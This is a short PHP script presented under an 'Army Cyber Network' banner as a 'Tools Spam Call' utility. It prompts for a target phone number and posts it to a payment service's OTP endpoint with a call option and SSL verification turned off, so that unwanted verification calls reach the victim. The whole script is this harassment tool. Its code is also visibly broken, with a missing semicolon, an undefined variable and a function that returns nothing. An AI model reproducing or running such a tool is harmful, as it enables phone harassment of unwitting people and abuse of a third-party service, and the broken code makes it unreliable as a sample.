<?php
function send($phone){
        $qq = curl_init();
        curl_setopt($qq, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($qq, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($qq, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($qq, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($qq, CURLOPT_HEADER, true);
        curl_setopt($qq, CURLOPT_POST, 1);
        curl_setopt($qq, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $woi = curl_exec($qq);
        curl_close($qq);
                echo $woi."\n";
}
menu:
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
echo $red."
 __ __  ___  __  __   ___      __  ____   ___  ___  ___
 || // // \\ ||\ ||  // \\    (( \ || \\ // \\ ||\\//||
 ||<<  ||=|| ||\\|| (( ___     \\  ||_// ||=|| || \/ ||
 || \\ || || || \||  \\_||    \_)) ||    || || ||    ||\n";
echo $green."
==============================
|[!]  Army Cyber Network  [!]|
==============================\n";
echo "\n"
echo $blue."
Tools Spam Call\n";
echo $red."
Codec By MryM\n";
echo "Nomor Target\nroot@.Masukan : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
